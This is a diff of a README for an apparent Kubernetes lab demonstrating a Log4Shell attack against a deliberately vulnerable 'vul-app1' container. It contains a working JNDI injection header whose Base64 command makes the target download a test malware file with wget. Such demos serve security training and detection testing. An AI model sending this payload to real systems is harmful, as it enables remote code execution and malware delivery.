@@ -18,10 +18,13 @@ Running the Demo
 kubectl config set-context $(kubectl config current-context) --namespace=dirty-net2
 
 1. Get into the attacking host
+
 `
 kubectl exec -it pod-attack-machine -n dirty-net -- /bin/sh
 `
+
 2. Run the following two commands to execute the attack to the “vul-app1” container
+
 `
 curl -v vul-app1:8080 -H 'X-Api-Version: ${jndi:ldap://att-svr-5cd59d5f4-2vcfv:1389/Basic/Command/Base64/d2dldCBodHRwOi8vd2lsZGZpcmUucGFsb2FsdG9uZXR3b3Jrcy5jb20vcHVibGljYXBpL3Rlc3QvZWxmIC1PIC90bXAvbWFsd2FyZS1zYW1wbGUK}'
 `
